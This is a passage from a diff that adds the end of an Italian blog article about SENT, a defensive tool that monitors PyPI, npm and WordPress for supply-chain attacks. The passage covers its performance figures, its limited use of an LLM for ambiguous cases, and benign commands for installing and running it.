+    <span class="stat-label">eventi/sec (scoring)</span>
+  </div>
+  <div class="stat-card">
+    <span class="stat-value">1.32ms</span>
+    <span class="stat-label">analisi per pacchetto</span>
+  </div>
+  <div class="stat-card">
+    <span class="stat-value">0.4%</span>
+    <span class="stat-label">usa l'LLM</span>
+  </div>
+  <div class="stat-card">
+    <span class="stat-value">66.7%</span>
+    <span class="stat-label">scartato dal filtro</span>
+  </div>
+</div>
+
+<p>
+  Il collo di bottiglia non e' la CPU. L'analisi (AST parse + call_diff + feature extraction + scoring) prende 1.3 millisecondi per pacchetto. Il collo di bottiglia e' la rete: scaricare un pacchetto da PyPI prende 1-10 secondi. Per quello il sistema ha un worker pool con 6 thread, una coda con priorita' (i pacchetti piu' critici vengono processati prima), backpressure (se la coda cresce troppo i pacchetti a bassa priorita' vengono droppati), e cache su disco per non riscaricare la stessa versione. Il sistema scala non perche' e' veloce, ma perche' sa cosa ignorare.
+</p>
+
+<p>
+  L'AI e' la parte piu' costosa della pipeline. Quindi va usata il meno possibile. Il sistema locale fa detection: scoring, AST diff, call_diff, baseline comparison. L'LLM interviene solo per interpretare i casi ambigui, lo 0.4%. Non e' il motore, e' il giudice.
+</p>
+
+<p>
+  L'intero sistema gira su un laptop. Un singolo processo Python con 6 thread, SQLite, e ~200MB di cache disco.
+</p>
+
+
+<!-- ============================================================
+     SEZIONE 9 — IL CODICE
+     ============================================================ -->
+<h2><span class="section-number">09 — il codice</span>Provalo</h2>
+
+<p>
+  Il codice e' su GitHub: <a href="https://github.com/Pinperepette/SENT" target="_blank">github.com/Pinperepette/SENT</a>
+</p>
+
+<div class="code-block" data-lang="bash">
+<div class="code-wrap"><table><tbody>
+<tr><td class="ln">1</td><td class="code"><span class="cc"># installa</span></td></tr>
+<tr><td class="ln">2</td><td class="code"><span class="cv">pip</span> install httpx networkx rich click</td></tr>
+<tr><td class="ln">3</td><td class="code"></td></tr>
+<tr><td class="ln">4</td><td class="code"><span class="cc"># costruisci il grafo (una volta, ~10 secondi)</span></td></tr>
+<tr><td class="ln">5</td><td class="code"><span class="cv">python3</span> cli.py bootstrap</td></tr>
+<tr><td class="ln">6</td><td class="code"></td></tr>
+<tr><td class="ln">7</td><td class="code"><span class="cc"># monitora PyPI + npm + WordPress in tempo reale</span></td></tr>
+<tr><td class="ln">8</td><td class="code">SENT_ALERT_MIN_SCORE=500 <span class="cv">python3</span> cli.py watch -t 8 -i 30</td></tr>
+<tr><td class="ln">9</td><td class="code"></td></tr>
+<tr><td class="ln">10</td><td class="code"><span class="cc"># analizza un pacchetto specifico</span></td></tr>
+<tr><td class="ln">11</td><td class="code"><span class="cv">python3</span> cli.py analyze requests -e pypi</td></tr>
+<tr><td class="ln">12</td><td class="code"><span class="cv">python3</span> cli.py analyze woocommerce -e wordpress</td></tr>
+<tr><td class="ln">13</td><td class="code"></td></tr>
+<tr><td class="ln">14</td><td class="code"><span class="cc"># guarda i risultati</span></td></tr>
+<tr><td class="ln">15</td><td class="code"><span class="cv">python3</span> cli.py top</td></tr>
+</tbody></table></div>
+</div>
+
+<div class="insight-box">
+  <p><strong>L'idea non e' mia.</strong> L'architettura viene dalla conversazione tra <a href="https://twitter.com/evilsocket" target="_blank">@evilsocket</a> e <a href="https://twitter.com/N3mes1s" target="_blank">@N3mes1s</a>. Il grafo a cascata, la strategia diff-first, il repo WordPress SVN, sono idee loro. Io le ho implementate. Il codice e' stato costruito in una sessione usando un workflow agent-driven che sto sviluppando e validando.</p>
+</div>
+
+<p>
+  Dopo tutto questo circo, mi sono detto: faccio l'articolo. Birra, friggitrice ad aria, patatine. La iena e' andata a lavorare, chi mi ammazza.
+</p>
+
+<p style="margin-top: 3rem; font-family: var(--font-mono); font-size: 1rem; color: var(--text-secondary); text-align: center;">
+  La supply chain non e' insicura. E' solo lenta. E gli attaccanti no.
+</p>
+
+
+  </article>
+
+  <footer class="footer">
+    <p>Signal Pirate &copy; 2026</p>
+  </footer>
+
+  <script src="../js/main.js"></script>
+</body>
+</html>
